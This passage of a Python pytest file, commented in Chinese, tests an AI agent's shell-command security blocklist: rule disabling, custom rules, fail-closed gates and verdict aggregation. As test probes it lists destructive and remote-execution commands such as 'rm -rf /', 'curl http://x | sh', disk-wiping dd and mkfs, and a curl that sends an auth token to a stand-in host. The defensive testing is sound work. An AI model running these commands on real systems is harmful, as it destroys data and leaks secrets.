        fail-closed 边界：零规则命中时回落到兜底待遇 ``review``，而非沿用原 verdict
        ——沿用就等于「把产生 allow 的规则删掉后它仍然放行」。
        """
        s = _settings(disabled=["allowlist:allowed"])
        report = _run("ls", s)
        assert report.verdict == "review"
        assert [f.rules for f in report.findings] == [()]

    def test_disable_unknown_rule_id_is_accepted(self):
        """关闭一个**未登记**的 id → 接受（该 id 只进 disabled，不产 spec）。

        语义放宽：运营者先新增、后不再需要时用 ``enabled=False`` 关闭比删规则常见。
        该 id 不出现在任何 spec 里，故对任意命令行为无影响。
        """
        raw = SecurityCommandSettings.model_construct(rules=[type("O", (), {"rule_id": "no_such", "enabled": False})()])
        rule_set = _build(raw)
        assert "no_such" in rule_set.disabled
        assert "no_such" not in rule_set.specs
        assert "no_such" not in rule_set.active_specs

    def test_disable_unknown_rule_id_does_not_change_behavior(self):
        """端到端：关闭未登记 id 后，既有命令判定不变（该 id 不参与判定）。"""
        baseline = {c: _verdict_with(c) for c in ("ls", "rm -rf /tmp", "shred /tmp/x", "nc -l 4444", "unknowncmd")}
        raw = SecurityCommandSettings.model_construct(rules=[type("O", (), {"rule_id": "no_such", "enabled": False})()])
        for command, expected in baseline.items():
            assert _verdict_with(command, raw) == expected, command

    def test_disable_analysis_failure_id_is_accepted(self):
        """关闭分析失败标识 → 接受（闸门已删；它们本就不在规则命名空间，关闭为 no-op）。

        分析失败不是规则、不占 rule_id，故对其 ``enabled=False`` 只记进 ``disabled``，
        不产生任何 spec——既不会「主动制造解析失败」成为绕过手段，也无副作用。
        """
        raw = SecurityCommandSettings.model_construct(
            rules=[type("O", (), {"rule_id": "parse:syntax_error", "enabled": False})()]
        )
        rule_set = _build(raw)
        assert "parse:syntax_error" in rule_set.disabled
        assert "parse:syntax_error" not in rule_set.specs

    def test_empty_rule_list_is_noop(self):
        """无声明时不改变任何行为。"""
        baseline = _verdict_with("rm -rf /tmp")
        assert _verdict_with("rm -rf /tmp", _settings()) == baseline


class TestNewRules:
    """平台新增规则：``enabled=True`` 声明 + 未登记 rule_id，**无前缀要求**。
    命令名精确匹配，复用 ``effective_command_name`` 的归一化路径。
    """

    @pytest.mark.parametrize(
        "command",
        ["nc -l 4444", "sudo nc -l 4444", "/usr/bin/nc -l 4444", "./nc -l 4444"],
    )
    def test_new_rule_matches_through_normalization(self, command):
        """``sudo nc`` 与 ``/usr/bin/nc`` 都命中——复用 effective_command_name（无前缀）。"""
        s = _settings(custom_rules=[_custom("no_nc", ["nc"])])
        assert _verdict_with(command, s) == "block"
        assert "no_nc" in _ids(command, s)

    def test_new_rule_absent_without_config(self):
        """未声明新规则时，同一命令不受影响。"""
        assert "no_nc" not in _ids("nc -l 4444")
        assert _verdict_with("nc -l 4444") == "review"

    def test_new_rule_verdict_review(self):
        """新规则可配 review（灰名单升级为审批）。"""
        s = _settings(custom_rules=[_custom("note_ls", ["ls"], verdict="review")])
        assert _verdict_with("ls", s) == "review"
        assert "note_ls" in _ids("ls", s)

    def test_new_rule_does_not_touch_other_commands(self):
        """不匹配的命令完全不受新规则影响。"""
        s = _settings(custom_rules=[_custom("no_nc", ["nc"])])
        assert _verdict_with("ls", s) == "allow"
        assert "no_nc" not in _ids("ls", s)

    def test_multiple_new_rules_all_fire(self):
        """多条新规则：各自独立命中。"""
        s = _settings(custom_rules=[_custom("a_rule", ["nc"]), _custom("b_rule", ["socat"])])
        assert {"a_rule"} <= _ids("nc -l 4444", s)
        assert {"b_rule"} <= _ids("socat - TCP:host:80", s)


class TestConstructionGates:
    """构造期 fail-closed 闸门（全部在 ``build_rule_set``）。"""

    @pytest.mark.parametrize(
        "rule_id",
        [
            "parse:syntax_error",
            "parse:unsupported_syntax",
            "parse:internal_error",
            "budget:max_command_length",
            "budget:max_nodes",
            "budget:max_depth",
            "budget:max_reparse_depth",
            "budget:recursion",
            "input:null_byte",
            "empty:no_executable_command",
            "analysis:incomplete",
            "rule:internal_error",
            "ast:unknown_node",
        ],
    )
    def test_analysis_failure_ids_with_empty_tokens_are_rejected(self, rule_id):
        """分析失败标识的 ``enabled=True`` 声明（空 tokens）→ 由**闸门 4**（不可字面化）拒绝。

        「替换分析失败标识」的专用闸门已删。该 id 不在 ``all_specs``，故视作**新增规则**；
        空内容由闸门 4 拦下（与任何未登记 id 的空声明同一判据）。
        """
        raw = SecurityCommandSettings.model_construct(
            rules=[
                type(
                    "O",
                    (),
                    {
                        "rule_id": rule_id,
                        "verdict": "allow",
                        "justification": "x",
                        "enabled": True,
                        "tokens": [],
                    },
                )()
            ]
        )
        with pytest.raises(RuleConfigError, match="不可字面化"):
            _build(raw)

    def test_code_predicate_builtin_cannot_be_shadowed(self):
        """**代码谓词内置规则**不可用声明式内容替换（会静默解除其代码判定）。"""
        raw = SecurityCommandSettings.model_construct(
            rules=[
                type(
                    "O",
                    (),
                    {
                        "rule_id": "mkfs_format",
                        "verdict": "block",
                        "justification": "x",
                        "enabled": True,
                        "tokens": ["mkfs"],
                    },
                )()
            ]
        )
        with pytest.raises(RuleConfigError, match="代码语义"):
            _build(raw)

    def test_not_literalizable_declaration_rejected(self):
        """声明不可字面化（非 token 形态）→ 拒收（对内置与新规则同一判据）。"""
        raw = SecurityCommandSettings.model_construct(
            rules=[
                type(
                    "O",
                    (),
                    {"rule_id": "any_new", "verdict": "block", "justification": "x", "enabled": True, "tokens": [123]},
                )()
            ]
        )
        with pytest.raises(RuleConfigError, match="不可字面化"):
            _build(raw)

    def test_empty_tokens_rejected_for_new_rule(self):
        """``enabled=True`` + 空 tokens → 拒绝（无声明式内容，建不出判定）。"""
        raw = SecurityCommandSettings.model_construct(
            rules=[
                type(
                    "O",
                    (),
                    {"rule_id": "empty_new", "verdict": "block", "justification": "x", "enabled": True, "tokens": []},
                )()
            ]
        )
        with pytest.raises(RuleConfigError, match="不可字面化"):
            _build(raw)

    def test_empty_tokens_rejected_for_builtin_too(self):
        """**同一判据**：``enabled=True`` + 空 tokens 替换内置也拒（消除双重含义）。"""
        raw = SecurityCommandSettings.model_construct(
            rules=[
                type(
                    "O",
                    (),
                    {
                        "rule_id": "allowlist:allowed",
                        "verdict": "allow",
                        "justification": "x",
                        "enabled": True,
                        "tokens": [],
                    },
                )()
            ]
        )
        with pytest.raises(RuleConfigError, match="不可字面化"):
            _build(raw)

    def test_review_is_not_a_rule_and_cannot_be_declared(self):
        """``review`` 不是规则：以 ``enabled=True`` 声明它落进新增桶但无内容 → 拒下。"""
        raw = SecurityCommandSettings.model_construct(
            rules=[
                type(
                    "O",
                    (),
                    {
                        "rule_id": "whitelist:review",
                        "verdict": "allow",
                        "justification": "x",
                        "enabled": True,
                        "tokens": [],
                    },
                )()
            ]
        )
        with pytest.raises(RuleConfigError, match="whitelist:review"):
            _build(raw)


class TestAggregationStaysStrictest:
    """平台可逐条声明规则，但**不能**改变聚合语义（block > review > allow）。"""

    def test_new_allow_cannot_override_real_block(self):
        """新 allow 规则存在时，另一条真 block 仍然压过去。"""
        s = _settings(custom_rules=[_custom("allow_echo", ["echo"], verdict="allow")])
        report = _run("echo a && rm -rf /tmp", s)
        assert report.verdict == "block"
        verdicts = {f.command_name: f.verdict for f in report.findings}
        assert verdicts["echo"] == "allow"
        assert verdicts["rm"] == "block"

    def test_one_block_among_allows_still_blocks(self):
        """多 entry 场景：一条 block 压过其余 allow。"""
        s = _settings(custom_rules=[_custom("allow_bad", ["badcmd"], verdict="allow")])
        report = _run("ls && badcmd && rm -rf /tmp", s)
        assert report.verdict == "block"
        verdicts = {f.command_name: f.verdict for f in report.findings}
        assert verdicts["ls"] == "allow"
        assert verdicts["badcmd"] == "allow"
        assert verdicts["rm"] == "block"

    def test_disabled_rule_leaves_empty_finding(self):
        """关闭唯一命中规则后该 entry 零规则命中 → ``rules == ()``、verdict = review。

        这是**构造期禁用**的 fail-closed 回归：封闭规则靠不进 ``active_specs``，
        verdict 由 ``_evaluate_rules`` 控制流重算（不是「聚合后改写」）。
        """
        s = _settings(disabled=["shred_file"])
        report = _run("shred /tmp/x", s)
        (finding,) = report.findings
        assert finding.verdict == "review"
        assert finding.rules == ()


class TestRuleConfigValidation:
    """非法平台配置在规则装配（``build_rule_set``）时 fail-closed。

    ``SecuritySettings(...)`` 构造是**纯配置构造**（嵌套 dict 由 pydantic 投影），
    不做规则语义校验——语义判据需要规则全集与聚合层的转换器，故归
    ``build_rule_set`` 在首条 ``validate_command`` 时执行。schema 层另有一道更早的
    pydantic 把关（类型 / 必填字段），那是本类的另半数用例测的东西。
    """

    def test_analysis_failure_declaration_is_rejected_at_assembly(self):
        """分析失败标识的声明（无 tokens）→ 装配期由闸门 4（不可字面化）拒绝。

        「替换分析失败标识」专用闸门已删；该声明现按「未登记 id 的新增」处理，
        空内容由闸门 4 拦下。

        构造先成功，钉住「加载期不校验」这一新契约。
        """
        settings = SecuritySettings(
            command={"rules": [{"rule_id": "parse:syntax_error", "verdict": "allow", "justification": "x"}]}
        )  # 加载期不再校验，构造本身必须成功
        with pytest.raises(RuleConfigError, match="不可字面化"):
            build_rule_set(
                settings.command,
                RULE_SPECS,
                to_spec=cs._spec_from_declaration,
                predicate_for=cs._predicate_for_content_override,
            )

    def test_code_predicate_shadow_is_rejected_at_assembly(self):
        """代码谓词内置规则不可被声明式内容替换——装配期即拒。

        构造先成功，钉住「加载期不校验」这一新契约。
        """
        settings = SecuritySettings(
            command={
                "rules": [
                    {
                        "rule_id": "mkfs_format",
                        "verdict": "block",
                        "justification": "x",
                        "tokens": ["mkfs"],
                    }
                ]
            }
        )  # 加载期不再校验，构造本身必须成功
        with pytest.raises(RuleConfigError, match="代码语义"):
            build_rule_set(
                settings.command,
                RULE_SPECS,
                to_spec=cs._spec_from_declaration,
                predicate_for=cs._predicate_for_content_override,
            )

    def test_construction_accepts_disable_of_unknown_id(self):
        """关闭未登记 id → 加载期**接受**（闸门已删），构造期不报错。

        语义放宽：先新增、后不需要时用 ``enabled=False`` 关闭比删规则常见。
        """
        settings = SecuritySettings(command={"rules": [{"rule_id": "no_such", "enabled": False}]})
        assert settings is not None

    def test_construction_rejects_malformed_tokens_at_schema_layer(self):
        """非 token 形态内容在 **schema 层**就被拒（比命令层闸门更早）。

        ``RuleSpecConfig.tokens`` 的类型是 ``list[str | list[str]]``，故 ``[123]``
        过不了 pydantic —— 这比命令层的准入判据（``_declaration_is_literalizable``）更早失败，
        是两道防线的第一道。
        """

        with pytest.raises(ValidationError):
            SecuritySettings(
                command={"rules": [{"rule_id": "bad", "verdict": "block", "justification": "x", "tokens": [123]}]}
            )

    def test_construction_requires_verdict_when_enabled(self):
        """``enabled=True`` 缺 ``verdict`` → schema 层拒（存在性判定）。"""

        with pytest.raises(ValidationError):
            SecuritySettings(command={"rules": [{"rule_id": "rm_recursive_force"}]})

    def test_construction_accepts_disable_only_declaration(self):
        """``enabled=False`` 只给 rule_id → 合法（不被迫编造 verdict / justification）。"""
        settings = SecuritySettings(command={"rules": [{"rule_id": "shred_file", "enabled": False}]})
        assert settings.command.rules[0].enabled is False

    def test_construction_accepts_valid_config(self):
        settings = SecuritySettings(
            command={
                "rules": [
                    {
                        "rule_id": "rm_recursive_force",
                        "verdict": "allow",
                        "justification": "降级",
                        "tokens": ["rm"],
                    }
                ]
            }
        )
        assert settings.command.rules[0].verdict == "allow"

    def test_construction_without_rule_config_is_unaffected(self):
        """不配规则时既有字段不受任何校验层干扰。"""
        settings = SecuritySettings(command={"enable_command_blocklist": False})
        assert settings.command.enable_command_blocklist is False


class TestRuleSetHasNoPatchLayer:
    """统一模型的护栏：``RuleSet`` 不再携带「生效覆盖表」这一补丁层。"""

    def test_ruleset_has_disabled_field_not_overrides(self):
        names = {f.name for f in fields(RuleSet)}
        assert "disabled" in names
        assert "overrides" not in names

    def test_no_effective_rule_symbols_remain(self):
        cd = importlib.import_module("aidev_agent.packages.security.command.command_definitions")
        assert not hasattr(cd, "EffectiveRule")
        assert not hasattr(cd, "EffectiveRules")
        assert not hasattr(cd, "_override_tokens")
        cs = importlib.import_module("aidev_agent.packages.security.command.command_security")
        assert not hasattr(cs, "_apply_rule_overrides")

    def test_rule_result_has_no_audit_fields(self):
        names = {f.name for f in fields(RuleResult)}
        assert "overridden" not in names
        assert "default_verdict" not in names

    def test_disabled_specs_kept_in_specs_but_excluded_from_active(self):
        """被关闭的规则仍在 ``specs``（身份保留），但不进 ``active_specs``。"""
        rs = _build(_settings(disabled=["shred_file"]))
        assert "shred_file" in rs.specs
        assert "shred_file" not in rs.active_specs
        assert "shred_file" in rs.disabled

    def test_approval_payload_drops_audit_keys(self):
        """审批载荷不再带 ``overridden`` / ``default_verdict``（审计改为规则级事实）。"""
        report = _run("shred /tmp/x")
        payload = _build_command_review(report)
        entries = [rule for f in payload["findings"] for rule in f["rules"]]
        assert all("overridden" not in rule and "default_verdict" not in rule for rule in entries)

    def test_payload_stays_json_serializable_with_config(self):
        """载荷仍是普通 JSON（无 dataclass / set）。"""

        s = _settings(custom_rules=[_custom("no_nc", ["nc"], verdict="review")])
        report = _run("nc -l 4444", s)
        json.dumps(_build_command_review(report))


class TestRejectionWording:
    """拒绝文案要给模型**可操作**的信息，且归因到正确的机制。

    两类归因最易混淆，故各自钉住：
    - **黑名单**：真的命中危险命令 → 报「命令黑名单 + label(category)」；
    - **复杂度**：纯粹资源超限、无任何命中 → 报「命令复杂度过高」，
      而不是把内部计费明细（节点数/上限）拼给模型。
    """

    @pytest.mark.parametrize(
        ("command", "overrides"),
        [
            ("echo a && ls && uname -a", {"max_nodes": 3}),
            ("echo a", {"max_depth": 1}),
        ],
    )
    def test_pure_budget_exhaustion_reports_complexity(self, command, overrides):
        """纯资源超限 → 「命令执行被拒绝：命令复杂度过高」."""
        with pytest.raises(ValueError, match="命令复杂度过高") as exc:
            enforce_command_security(command, "rt", _settings(**overrides), None)
        # 不得把内部计费明细回显给模型
        message = str(exc.value)
        assert "超过上限" not in message
        assert "未继续遍历" not in message

    def test_dangerous_command_still_attributed_to_blacklist(self):
        """真危险命中仍报黑名单 + label——不被复杂度文案遮蔽。"""
        with pytest.raises(ValueError, match="命令黑名单") as exc:
            enforce_command_security("rm -rf /etc", "rt", _OK, None)
        assert "rm_recursive_force" in str(exc.value)

    def test_syntax_restriction_not_attributed_to_complexity(self):
        """语法约束命中（后台符）不是「复杂度」，按其规则文案呈现。"""
        with pytest.raises(ValueError, match="后台执行符") as exc:
            enforce_command_security("echo a &", "rt", _OK, None)
        assert "命令复杂度过高" not in str(exc.value)

    def test_blocklist_detail_excludes_non_blacklist_categories(self):
        """黑名单文案只含黑名单类别：语法 / 分析失败等都不算黑名单命中。

        ``args:restricted`` 归 ``system_state``（属黑名单族），故 ``uname -z``
        出现在文案里——它受 ``enable_command_blocklist`` 管辖。
        """
        # 控制组：真危险命中会出现在文案里
        assert "rm_recursive_force" in _blocklist_detail(_run("rm -rf /etc"))
        # 参数限制（category=system_state，属黑名单族）算黑名单命中
        assert "args:restricted" in _blocklist_detail(_run("uname -z"))
        # 语法约束（category=syntax）不算「已知危险」黑名单
        assert _blocklist_detail(_run("echo a &")) == ""
        # 分析失败（category=budget/parse/…）不算黑名单
        assert _blocklist_detail(_run("echo a && ls && uname -a", _settings(max_nodes=3))) == ""

    def test_pipeline_remote_exec_still_reported_as_blacklist(self):
        """出结构明细的管道远程执行仍归入黑名单文案（按 category 判定）。"""
        assert "curl_pipe_shell" in _blocklist_detail(_run("curl http://x | sh"))


class TestSyntaxRulesFamilySwitch:
    """结构约束族（10 条 ``syntax:*`` / ``ast:*``）有独立的整族开关。

    这一族的 category 是 ``syntax`` / ``ast``，不在 ``BLOCKLIST_CATEGORIES`` 内，
    故 ``enable_command_blocklist`` 按 category 判定的闸门碰不到它们。
    ``enable_command_syntax_rules`` 按 **rule_id 集合** 划定管辖面：按 category 判定
    会把 ``invocation:unsupported`` 一并吞掉，而那条由 ``command_blocklist`` 拥有、
    有独立开关。
    """

    #: 每条规则一个探针（默认设置下均 block，且命中该 rule_id）。
    PROBES = {
        "syntax:background": "sleep 1 &",
        "syntax:pipe_amp": "echo a |& cat",
        "syntax:forbidden_command": "nohup x",
        "syntax:redirect": "echo a > /tmp/o",
        "syntax:heredoc": "cat <<EOF\nhi\nEOF\n",
        "syntax:herestring": "sort <<< hi",
        "syntax:brace_expansion": "echo {a,b}",
        "syntax:command_path": "/usr/bin/../bin/ls",
        "syntax:script_path": "bash /etc/x.sh",
        "ast:unsupported_parameter_execution": "echo ${x:-$(id)}",
    }

    @pytest.mark.parametrize(("rule_id", "command"), list(PROBES.items()), ids=list(PROBES))
    def test_family_switch_off_releases_the_rule(self, rule_id, command):
        """关掉族开关 → 该规则完全不再产出（整条不贡献，而非降级为别的判定）。"""
        assert rule_id in _ids(command), "对照：默认下必须命中，否则下面的断言恒真"
        off = SecurityCommandSettings(enable_command_syntax_rules=False)
        assert rule_id not in _ids(command, off)

    @pytest.mark.parametrize(("rule_id", "command"), list(PROBES.items()), ids=list(PROBES))
    def test_blocklist_family_switch_does_not_govern_these(self, rule_id, command):
        """``enable_command_blocklist=False`` 关不掉结构约束族——两族分组独立。"""
        off = SecurityCommandSettings(enable_command_blocklist=False, enable_command_syntax_rules=True)
        assert rule_id in _ids(command, off)

    def test_family_switch_does_not_release_invocation_unsupported(self):
        """族开关不误吞 ``invocation:unsupported``——它由 ``command_blocklist`` 拥有。

        判据是 rule_id 集合而非 ``category in {"syntax", "ast"}``；后者会把这条
        一并吞掉，使同一条规则受两个开关管辖。
        """
        off = SecurityCommandSettings(enable_command_syntax_rules=False)
        assert _verdict_with("bash -c", off) == "block"
        assert "invocation:unsupported" in _ids("bash -c", off)

    def test_syntax_switch_does_not_release_blocklist_rules(self):
        """反向独立：族开关不释放「已知危险」族（``rm -rf`` 仍拦）。"""
        off = SecurityCommandSettings(enable_command_syntax_rules=False)
        assert _verdict_with("rm -rf /tmp/x", off) == "block"


# ========== 规则全集：形状、防漂移、依赖边界 ==========


#: 规则全集的唯一聚合点。
_SPECS = RULE_SPECS

#: 允许列表全量命令名。
ALLOWLIST_COMMANDS: frozenset[str] = ALLOWED_COMMANDS

#: ``BLOCKLIST_RULES`` 全量 rule_id 集合（含 ``args:restricted``，判定真源的投影）。
BLOCKLIST_RULE_IDS: frozenset[str] = frozenset(spec.rule_id for spec in BLOCKLIST_RULES)

_COMMAND_DIR = pathlib.Path(cs.__file__).parent


class TestRegistryShape:
    """注册表必须是 29 条、无重复、命名空间式 id 的前缀与 category 一致。"""

    def test_exactly_29_rules(self):
        """全部 29 条 rule_id 已登记（14 命名空间式 + 15 危险标签）。

        分析失败（13 条）**不在此**：它们不是规则，由 ``AnalysisFailure`` 承载。
        ``review`` **也不在此**：它不是规则，是「未命中任何规则」的处置，
        由 ``_evaluate_rules`` 的控制流产出。
        """
        assert len(RULE_SPECS) == 29

    def test_no_duplicate_rule_ids(self):
        """dict 构造不会吞掉重复项——数量自检已保证，这里显式断言一次。"""
        ids = [spec.rule_id for spec in RULE_SPECS.values()]
        assert len(ids) == len(set(ids))

    @pytest.mark.parametrize("rule_id", sorted(RULE_SPECS))
    def test_spec_rule_id_matches_key(self, rule_id):
        """``RULE_SPECS[key].rule_id == key``（防止拷贝粘贴错位）。"""
        assert RULE_SPECS[rule_id].rule_id == rule_id

    @pytest.mark.parametrize(
        ("rule_id", "category"),
        [
            # prefix == category（命名空间式 id 全部如此）
            ("syntax:background", "syntax"),
            ("syntax:pipe_amp", "syntax"),
            ("syntax:forbidden_command", "syntax"),
            ("syntax:redirect", "syntax"),
            ("syntax:heredoc", "syntax"),
            ("syntax:herestring", "syntax"),
            ("syntax:brace_expansion", "syntax"),
            ("syntax:command_path", "syntax"),
            ("syntax:script_path", "syntax"),
            ("ast:unsupported_parameter_execution", "ast"),
            ("dynamic:execution_content", "dynamic"),
            ("invocation:unsupported", "invocation"),
            ("allowlist:allowed", "allowlist"),
        ],
    )
    def test_namespaced_prefix_equals_category(self, rule_id, category):
        """多数命名空间式 id 的前缀等于 category（13/14；另一条见下表例外）。"""
        assert RULE_SPECS[rule_id].category == category

    @pytest.mark.parametrize(
        ("rule_id", "category", "why"),
        [
            (
                "args:restricted",
                "system_state",
                "category 记录的是黑名单族语义（``block`` ⇒ 属黑名单族），非 args 前缀",
            ),
        ],
    )
    def test_prefix_category_exceptions_are_documented(self, rule_id, category, why):
        """一条 id 的前缀**不等于** category。这是实测事实，不是可以「统一」的漂移。

        意义：后续「把按前缀分类改为按 category 分类」的重构**不是**可证 no-op ——
        这条在两种口径下会被分到不同组。任何此类重构必须单独处理它。
        """
        prefix, _, _ = rule_id.partition(":")
        spec = RULE_SPECS[rule_id]
        assert spec.category == category
        assert prefix != spec.category

    def test_review_is_not_a_rule(self):
        """``review`` 不是规则：不在 RULE_SPECS、也没有任何规则落 review verdict。

        与 ``TestRuleSpecShape::test_review_is_not_a_rule`` /
        ``TestHardRejectTwoGates::test_review_cannot_be_configured_because_it_is_not_a_rule``
        **三处并存**：三者断言各不相同，刻意保留。
        """
        assert "whitelist:review" not in RULE_SPECS
        assert not any(spec.verdict == "review" for spec in RULE_SPECS.values())

    @pytest.mark.parametrize("rule_id", sorted(ANALYSIS_FAILURE_IDS))
    def test_analysis_failure_ids_are_not_in_the_rule_registry(self, rule_id):
        """13 条分析失败标识存在于 ``AnalysisFailure`` 且**不在** ``RULE_SPECS`` 中。

        这是**双向**的：前半句保证标识仍被承载（否则归因丢失），
        后半句保证它们不占用规则模型（否则平台可覆盖制造解析失败绕过的攻击面）。
        """
        assert rule_id in ANALYSIS_FAILURE_IDS
        assert rule_id not in RULE_SPECS

    def test_analysis_failure_namespace_is_disjoint_from_rules(self):
        """分析失败命名空间与规则命名空间**不相交**（不可配判据的前提）。"""
        assert ANALYSIS_FAILURE_IDS.isdisjoint(set(RULE_SPECS))


#: rule_id 的形状（命名空间式 ``prefix:name``）。全文件共用一份，避免多处漂移。
_RULE_ID_RE = re.compile(
    r"^(syntax|ast|parse|input|empty|budget|analysis|rule|invocation|dynamic|args|allowlist):[a-z_]+$"
)

#: **id 定义方**：这些模块拥有规则内容并定义自己的 rule_id 字面量（合法）。
#:
#: - ``command_allowlist`` / ``command_syntax_rules`` / ``command_security``：
#:   各自拥有并导出所产出规则的 id 常量与 ``*_RULES`` —— 数据模块拥有自己的规则。
#: - ``command_blocklist``：拥有 ``dynamic:execution_content`` /
#:   ``invocation:unsupported`` 两条命名空间式 id，故是定义方。
#: - ``command_definitions``：**分析失败 id 的定义方**。``AnalysisFailure`` 枚举在此定义
#:   13 个失败标识的字面量；它们不是规则，故不在 ``RULE_SPECS``，但字面量本身必须有
#:   一处归属地。该模块同时承载「规则身份 / 生效机制」与规则文案（
#:   ``JUSTIFICATION_TEMPLATES`` / ``JUSTIFICATION_PARAMS``）；文案是数据，与机制同居
#:   一处是为了让「模板 ↔ 声明 ↔ 填充」的对照不跨模块。规则**内容**仍然只在各产出方
#:   模块：若有人把具体规则数据（``*_RULES``）搬进来，
#:   :meth:`TestRegistryCoversLiterals.test_base_module_holds_no_rule_decision_data`
#:   会直接变红，不依赖本表。
#: - ``command_parser``：只提供遍历 / 词法 / 名字解析口径，当前不含 rule_id 字面量。
#:   留在表内作为解析层的显式豁免——它既不拥有规则数据，也未被断言为「非定义方」。
_DEFINITION_OWNERS = {
    "command_definitions.py",
    "command_allowlist.py",
    "command_parser.py",
    "command_blocklist.py",
    "command_syntax_rules.py",
    "command_security.py",
}


def _emitted_literals() -> set[str]:
    """收集**引用方**（producer 但非 id 定义方）中形如 ``prefix:name`` 的字符串字面量。

    刻意排除 :data:`_DEFINITION_OWNERS`（那几处的字面量是合法的「定义」而非「引用」）。
    引用方一律应引用定义方导出的常量，故这里若不返回空集，说明有人又内联了字面量。
    """
    found: set[str] = set()
    for path in _COMMAND_DIR.glob("*.py"):
        if path.name in _DEFINITION_OWNERS:
            continue
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if isinstance(node, ast.Constant) and isinstance(node.value, str) and _RULE_ID_RE.fullmatch(node.value):
                found.add(node.value)
    return found


def _all_literals() -> set[str]:
    """``command/`` 下**全部**模块的 rule_id 字面量（含定义方），用于完整性核对。"""
    found: set[str] = set()
    for path in _COMMAND_DIR.glob("*.py"):
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if isinstance(node, ast.Constant) and isinstance(node.value, str) and _RULE_ID_RE.fullmatch(node.value):
                found.add(node.value)
    return found


class TestRegistryCoversLiterals:
    """任何出现在代码里的 rule_id 字面量都必须已登记。"""

    def test_all_emitted_literals_are_registered(self):
        """新增内联字面量而未登记 → 本条变红（这是核心的防漂移闸门）。

        合法归属**两类**：规则 id → ``RULE_SPECS``；分析失败 id → ``AnalysisFailure``。
        两者之外的命名空间式字面量即漂移。
        """
        unregistered = _all_literals() - set(RULE_SPECS) - ANALYSIS_FAILURE_IDS
        assert unregistered == set(), f"未登记的 rule_id 字面量：{sorted(unregistered)}"

    def test_producers_contain_no_inline_rule_id_literals(self):
        """**引用方**不得内联 rule_id 字面量——应引用定义方导出的常量。

        字面量只允许出现在 :data:`_DEFINITION_OWNERS`。有人再往 ``command_security``
        或 ``command_blocklist`` 里写 ``"syntax:xxx"`` 即变红。
        """
        assert _emitted_literals() == set()

    def test_rule_id_consumers_agree_with_registry(self):
        """id **消费方**（含注册表机制）引用的每个 ``*_ID`` 常量都指向已登记 id 或分析失败标识。

        覆盖两处：本模块的机制只应引用自己拥有的东西；各数据模块导出的 ``*_ID`` /
        规则名常量——数据模块既定义 id 又消费它，故这是「定义与聚合之间没有错位」
        的闸门。

        id 的合法归属有两类：
        1. **规则** id——必须在 ``RULE_SPECS``；
        2. **分析失败** id——必须在 ``AnalysisFailure``（它们不是规则，不占规则模型）。
        两者之外的常量即漂移。
        """

        known = set(RULE_SPECS) | ANALYSIS_FAILURE_IDS
        checked = 0
        for module in (cd, cp_mod, cwl, csr, cs_mod):
            constants = {
                name: value
                for name, value in vars(module).items()
                if name.isupper() and isinstance(value, str) and ":" in value
            }
            for name, value in constants.items():
                assert value in known, f"{module.__name__}.{name} = {value!r} 既不在 RULE_SPECS 也不在 AnalysisFailure"
                checked += 1
        assert checked > 0  # 确有这类常量

    def test_base_module_holds_no_rule_decision_data(self):
        """基础定义模块**不含**任何**规则判定数据**。

        这是核心不变量：规则**判定内容**（``*_RULES`` 判定集）住在产出方模块，基础定义
        模块只承载类型（``RuleSpec`` / ``Pattern`` / 结果契约）、机制
        （``build_rule_set``）、规则**文案**与归因常量。若有人把判定内容搬回来，
        本条变红。

        三类字面量**合法地**住在本模块，故从断言里排除，否则会把它们误判成违规：

        - ``AnalysisFailure`` 的 13 个归因标识（``parse:syntax_error`` 等）——不是规则；
        - 8 个 ``*_ID`` 常量——值是 ``AnalysisFailure.<X>.value`` 的再导出；
        - ``JUSTIFICATION_TEMPLATES`` / ``JUSTIFICATION_PARAMS`` 的 ``rule_id`` 键
          ——它们是**文案登记表**的键，不是判定内容（判定内容仍在各产出方模块）。
        """
        # 违规形态：模块级持有规则**判定集**（``*_RULES`` 这类规则数据表）。
        rule_collections = {name for name in vars(cd) if name.endswith("_RULES")}
        assert rule_collections == set(), f"基础定义模块出现了规则集：{sorted(rule_collections)}"

        source = (_COMMAND_DIR / "command_definitions.py").read_text(encoding="utf-8")
        literals = {
            node.value
            for node in ast.walk(ast.parse(source))
            if isinstance(node, ast.Constant) and isinstance(node.value, str) and _RULE_ID_RE.fullmatch(node.value)
        }
        allowed = {member.value for member in cd.AnalysisFailure} | set(cd.JUSTIFICATION_PARAMS)
        surplus = literals - allowed
        assert surplus == set(), f"基础定义模块出现规则 id 字面量（非分析失败 / 非文案登记）：{sorted(surplus)}"

    def test_dangerous_labels_are_registered(self):
        """``BLOCKLIST_RULES`` 的 label 全部登记（15 个危险标签 + ``args:restricted``）。"""
        assert set(RULE_SPECS) >= BLOCKLIST_RULE_IDS
        assert len(BLOCKLIST_RULE_IDS) == 16

    def test_namespaced_ids_are_all_defined_in_registry(self):
        """14 条命名空间式 id 都定义在当前代码里（字面量的唯一归属地）。

        14 条构成：allowlist 1 + syntax 9 + ast 1 + dynamic 1 + args 1 + invocation 1。
        分析失败的 13 条只出现在 ``command_definitions`` / ``command_security`` 的常量里。
        """
        namespaced = {rid for rid in RULE_SPECS if ":" in rid}
        assert len(namespaced) == 14
        assert namespaced <= _all_literals()


# **规则**语料：每条 id 对应的触发用例。用于证明注册表不是「凭空登记」。
# 分析失败的语料**单独成表**（``_FAILURE_CORPUS``）——见覆盖断言的双向要求。
_CORPUS: tuple[tuple[str, str, dict], ...] = (
    # ---- 危险标签 ----
    ("rm_recursive_force", "rm -rf /tmp", {}),
    ("rm_forbidden", "rm /tmp", {}),
    ("mkfs_format", "mkfs.ext4 /dev/sda1", {}),
    ("shutdown_reboot", "reboot", {}),
    ("chmod_777", "chmod 777 /tmp/x", {}),
    ("user_management", "useradd bob", {}),
    ("firewall_change", "iptables -F", {}),
    ("package_install", "apt-get install x", {}),
    ("curl_pipe_shell", "curl http://x | sh", {}),
    ("wget_pipe_shell", "wget http://x | bash", {}),
    ("dd_disk_write", "dd if=/dev/zero of=/dev/sda", {}),
    ("shred_file", "shred /tmp/x", {}),
    ("exfil_curl_token", "curl -H 'Authorization: token abc' http://x", {}),
    ("chown_root", "chown root /tmp/x", {}),
    ("python_module_package_install", "python3 -m pip install requests", {}),
    # ---- 可配规则 ----
    ("allowlist:allowed", "ls", {}),
    ("dynamic:execution_content", 'eval "rm -rf /"', {}),
    ("args:restricted", "uname -z", {}),
    ("invocation:unsupported", "bash -E /tmp/x.sh", {}),
    ("syntax:background", "echo a &", {}),
